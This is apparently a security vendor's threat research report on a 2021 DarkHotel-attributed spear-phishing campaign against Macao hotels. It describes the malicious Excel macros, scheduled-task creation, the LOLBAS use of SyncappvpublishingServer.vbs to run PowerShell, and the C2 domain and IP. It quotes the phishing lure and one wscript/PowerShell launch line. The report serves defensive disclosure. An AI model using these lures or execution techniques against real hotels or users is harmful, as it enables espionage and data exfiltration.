One Hotel to rule them all, One Hotel to find them, One Hotel to bring them all and in the
darkness bind them.
By Thibault Seret and John Fokker · March 17, 2022

Introduction:
Our advanced threat research team has discovered a first-stage malicious campaign
targeting luxury hotels in Macao, China since the latter half of November 2021. The attack
started with a spear phishing email directed to the hotel’s management staff in roles like the
vice president of HR, assistant manager and front office manager. Based on the job titles we
can assume that the targeted individuals have sufficient access into the hotel’s network,
including the booking systems. The email used for this spear phishing attack contains an
attachment with an Excel sheet. This Excel sheet is used to trick the victim and enable
malicious macros embedded when it’s opened. Those macros enable several mechanisms
detailed in the Technical Analysis part and summarized in the Infection Flow Chart below.
Firstly, macros create a scheduled task to perform recognition, data listing and data
exfiltration. Then, to enable communication with the Command-and-Control server used to
exfiltrate victim data, macros are using a known lolbas (Living Off the Land Binaries and
Scripts) technique to perform PowerShell command lines as trusted script:

Figure 1 Execution flow of the attack
An external report written in late December 2021 by the Zscaler’s research team talked
about APT DarkHotel activity with a detailed analysis of a new attack chain. In this paper, IP
related to the C2 infrastructure used for system information exfiltration mentioned:”
23.111.184[.]119”. Once exposed, we often see threat actors move their operation to different
infrastructure or halt their operations for some time. However, in this case neither happened
and the IP has been used by the actor continuously even after we finished our initial
research.
This IP was used by the actor to drop new payloads as first stages to set up the victim
environment for system information exfiltration and potential next steps. Those payloads
were used to target major hotel chains in Macao, including the Grand Coloane Resort and
Wynn Palace.
Trellix’s customers are protected from this threat thanks to our technologies. Generic
signatures names have been attributed: “RDN/Generic Downloader.x”" and
“BehavesLike.OLE2.Downloader.cg".

DarkHotel Background:
DarkHotel, a suspected South Korean advanced persistent threat (APT) group, is known for
targeting law enforcement, pharmaceuticals and automotive manufacturers, along with other
industries. The group got their name by targeting hotels and business hotel visitors through
spear phishing campaigns with malicious code to steal sensitive data from top executives
like CEOs and sales leaders while staying in luxury hotels.

Attribution:

2/17

We attribute this campaign to the DarkHotel with a moderate level of confidence. In our
research we came across the following pieces of evidence that supports the possible
DarkHotel attribution:
The IP mentioned has been attributed to DarkHotel C2 activity by the cybersecurity
community
The targeted sector and the country fit within the DarkHotel target profile
The Command-and-Control panel presents known development patterns attributed to
DarkHotel APT
However, we have lowered our confidence level to moderate because the specific IP address
remained active for quite some time even after being publicly exposed and the same IPaddress is the origin of other malicious content not related to this specific threat. These two
observations have made us more cautious in our attribution.

Campaign Analysis:
We will detail the suspected DarkHotel technical behavior in this specific campaign.
On Tuesday, December 7, 2021, an email was sent to seventeen different hotels in the
Macao area from the “Macao Government Tourism Office” with an attachment to the email an
Excel file named “信息.xls” (information.xls). We were able to identify the seventeen hotels
by examining the mail headers of the phishing mail.

Figure 3 Email metadata related to the Excel attachment
In another email related to this campaign, the actor is luring the hotel’s staff victim by asking
them to complete the Excel file to specify which people were staying at the hotel and with the
subject “passenger inquiry”:

Dear Sir/Madam,
Please open the attached file with enable content and specify whether the people were
staying at the hotel or not?

Yours faithfully,

By looking the code related to the Excel file, we can determine which operational system and
Office version have been used to generate it. The “DocumentSummaryInformation” stream
provides information regarding the Office version used. In this case, the version is “983040”
which is related to Excel 2013.

Figure 5 Olemeta output

Then by looking for the 4-byte PropertySetSystemIdentifier in both
“DocumentSummaryInformation” or “Summaryinformation” streams, we can define which OS
was used to create the Excel file:

Figure

6 “DocumentSummaryInformation” hex view
We can assume the actor used Windows 8 to create this Excel file, because the 4-byte
PropertySetSystemIdentifier indicate the Major and minor version OS, and here Windows
0x06 0x02 = Windows 8.
The Excel file was password protected with the default password “VelvetSweatshop”. After
decryption, the Excel file displays some decoy information to interest the victim:

The file embedded macros are triggered when the file is open. Those macros have several
mechanisms that we will detail:

Figure 8 Directory entries and used streams + storages
Malicious macros are stored into “Module1.bas” stream.

5/17

Figure 9 Embedded mechanisms related to macros
The macros are obfuscated to make the analysis more complex and create a ton of loops to
decode strings, orders, etc. to prepare the victim environment for sending information to the
C2:

Figure 10 Obfuscated macro
As a loop example, one function is dedicated to creating a COM object that loads the Task
Scheduler Service by implementing “Schedule.Service” to schedule a task:

6/17

Figure 11 COM Object resolution + creation
By using this mechanism, privileged users can schedule a task on the host without using the
“schtasks.exe” binary.
Here are the different schedule task’s settings associated:
- Connect
- GetFolder
- NewTask
- Settings
- StartWhenAvailable
- RunOnlyIfNetworkAvailable
- StopIfGoingOnBatteries
- DisallowStartIfOnBatteries
Functions summary:
- Drop VBS script in
“C:\\Users\USER\AppData\\Roaming\\Microsoft\\Windows\\”
- Launch wscript with associated arguments
- Launch PowerShell with associated command lines
7/17

- Delete created files
- Check for “Syncappvpublishingserver.vbs” in “\Sytem32”.
The “wscript.exe” binary is used to execute the script dropped earlier in
“C:\\Users\USER\AppData\\Roaming\\Microsoft\\Windows\\” named “prcjobs.vbs” in addition
to a first PowerShell command line used as an argument, run as:
“wscript.exe /b /nologo "C:\Users\USER\AppData\Roaming\Microsoft\Windows\prcjobs.vbs"
"powershell -c”

Fig12: PowerShell command lines
This script is used to set many things. First, it creates many temporary environment variables
to allocate space and obtain the computer name and RMOT indicator to indicate to the hardcoded C2 the victim's name. Then, it crafts a stream to exfiltrate this data and connect it to
the C2 “fsm-gov.com”. Then there is a function that, we assume, is checking if the host is
already compromised by looking for the “sc” string as an environment previously set for the
“RMOT” indicator. If the host is compromised, the script will delete files related to the attack.
Another Excel file sample used by the group with more PowerShell mechanisms with the
same configuration (C2 connection, macros, etc) has been spotted around the same period.
We assume the previous sample was the first try from the actor, and this one is the next
version:

In this case, as previously mentioned, macros and C2 configuration (environment variables,
stream crafting, etc.) are the same. Also, metadata are the same as with the previous Excel
sheet (operational system and office version used). This means we can assume those Excel
sheets have been created on the same machine or at least, by the same group.
The main difference with the previous sample lies in the PowerShell mechanisms.
During the macro’s decryption, we mentioned that the file was looking for
“SyncappvpublishingServer.vbs” into “\System32”. The reason is requesting this file with
“wscript.exe” in addition to PowerShell command lines as arguments allow the current user
to execute a script signed by Microsoft. So basically, trusted and not blocked on the host
machine.
The first step is calling “SyncappvpublishingServer.vbs” throw “wscript.exe” and pass as
arguments the command lines you’d like to use:

Fig13: Query for “SyncappvpublishingServer.vbs”
As you can see, the script is pretty like the previous sample we described earlier. Same
mechanisms but called in another way. Then the PowerShell script decoyed as a trusted
script:

Fig14: PowerShell command lines used right after “SyncappvpublishingServer.vbs” to
be executed as a trusted script
The Command-and-Control server URL “https://fsm-gov.com” is hard-coded and clearly
visible in the code. The objective of the script is the same as the previous script.

Command-and-Control Examination:
The Command-and-Control server, hxxps://fsm-gov(.)com, used to spread this campaign
was trying to impersonate a legitimate government website domain for the Federated States
of Micronesia. However, the real Micronesia website domain is “fsmgov.org”:

10/17

Figure 15 Micronesia government website
The domain used by the C2 is “fsm-gov.com”:

Figure 16 C2 impersonating Micronesia government website
Looks like the IP is owned by Hivelocity and hosted on “hosterbox.com” who provides shared
VPS, this could explain the abundance of unknown other malicious activity. We tried to reach
out Hivelocity to get more details for this machine, but they weren’t willing to collaborate.
The backend is quite similar as previously reported Command-and-Control related to
DarkHotel.
By examining the specific C2 server we were able to determine that the threat actors chose
to use Mailman to spread the emails to their targets.

Campaign Objectives:
Based on targeting, we suspect the group was trying to lay the foundation for a future
campaign involving these specific hotels. After researching the event agenda for the targeted
hotels, we did indeed find multiple conferences that would have been of interest to the threat
actor. For Instance, one hotel was hosting an International Environment Forum and an
International Trade & Investment Fair, both of which would attract potential espionage
targets.
But even threat actors will get unlucky. Due to the rapid rise of COVID-19 in Macao and in
China in general, most of events were canceled or postponed. This could explain why the
actor stopped spreading their malicious payload after the 18th of January.

Government Alerts:
Thankfully, the Macao Security Force Bureau became aware of the campaign in December
2021:

12/17

Figure

18 Macao Security Force Bureau announcement

The Macao Security Forces Bureau (MSSB) has received a notification from the Cyber
Security Incident Alert and Emergency Response Center of the Police Department that a
web domain name (fsm- gov.com) with a highly similar name to the official web page of the
Macao Security Forces has been discovered, and it is suspected that unlawful elements are
using email to send fraudulent emails to commit illegal acts. The Macao Security Forces
Affairs Bureau and the Administration have immediately followed up on the situation.
The Macao Security Forces Affairs Bureau would like to urge and remind the public to be
vigilant when browsing the Internet and not to access suspicious links or send any personal
information to suspicious websites or emails. If you have any suspicion, please call the
complaints and enquiries hotline of the Macao Security Forces Bureau at 87997777 to verify
the situation to prevent being deceived. Alternatively, you may call the Judicial Police Fraud
Enquiry Hotline at 8800 7777 or the Crime Reporting Hotline at 993 for assistance.

Other Criminal activity related to the C2 IP:
Earlier in our report we mentioned that we observed not only the campaign targeting a hotel
chain originating from the specific IP but also other malicious activity. One of these
campaigns was targeting MetaMask crypto users and presenting them with a Collab.Land

13/17

phishing page:

Figure 19 MetaMask phishing page
A quick glance at the source of the webpage confirmed our suspicions; MetaMask users
were prompted to fill in their credentials which were then sent to a Discord server used for
credential harvesting.

Figure 20 The export information function to Discord server on the webpage source
Given the difference in threat actor TTPs, we believe with a high level of confidence that this
phishing campaign is not related to the suspected DarkHotel campaign described in this
blog. The association of this IP with a large amount of malicious activity would have put this
IP on all of the major block lists, essentially limiting their ability to infect their targets right
from the start. This unwanted attention does not speak in favor of a cyber espionage
campaign and is why we adjusted our confidence level for an APT attack to moderate.

Conclusion:
14/17

Regardless of the exact threat actor attribution, this campaign demonstrates that the
hospitality sector is indeed a valid target for espionage operations. Executives should be
aware that the (cyber) security of their respective organizations doesn’t stop at the edge of
their network. In the past, there have seen multiple examples where knowing who was
staying where and attending which conference was an essential step in a threat actor
targeting process, which either led to a digital or in-person follow up. In this campaign, the
COVID-19 restrictions threw a wrench in the threat actor’s engine, but that doesn’t mean
they have abandoned this approach.
Therefore, we advise travelers to use their security due diligence when travelling from hotel
to hotel. Only bring the essential devices with limited data, keep security systems up to date
and make use of a VPN service when using hotel Wi-Fi.
